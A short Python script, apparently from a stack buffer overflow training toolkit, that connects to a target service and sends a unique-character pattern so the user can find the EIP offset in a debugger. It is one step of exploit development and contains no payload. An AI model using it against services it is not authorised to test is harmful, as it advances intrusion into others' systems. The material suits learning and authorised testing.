#!/usr/bin/python3
#_*_ coding: utf8 _*_
#@JoshuaProvoste

import socket,argparse

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""

def hi():
	print("""
 _____ ___________ ___________ 
|  ___|_   _| ___ \  ___| ___ |
| |__   | | | |_/ / |__ | |_/ /
|  __|  | | |  __/|  __||    / 
| |___ _| |_| |   | |___| |\ \ 
\____/ \___/\_|   \____/\_| \_|                                            
    Find location value of EIP!                                                                                   
	""")

parser = argparse.ArgumentParser()
parser.add_argument("-ip","--host", type=str, required=True, help="IP host to pwn")
parser.add_argument("-sp","--port", type=int, required=True, help="Port of vulnerable service")
parser.add_argument("-pt","--pattern", type=str, required=True, help="Pattern of unique characters")
args = parser.parse_args()

if args.host and args.port and args.pattern:
    hi()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((args.host,args.port))
        sock.recv(1024).decode("utf-8")
        #payload_encoded = args.pattern.encode("utf-8")
        payload_encoded = args.pattern
        sock.send(payload_encoded.encode("utf-8"))
        print("Payload sent! Review your debugger tool.")
    except ConnectionRefusedError:
        print("Connection error. Review the IP address or port.")
        exit()
    except socket.timeout:
        sock.close()
        print("\nTimeout error.")
    except socket.error:
        sock.close()
        print("\nSocket error.")
        exit()
    except KeyboardInterrupt:
        sock.close()
        print("\n\nConnection closed. Bye!")
        exit()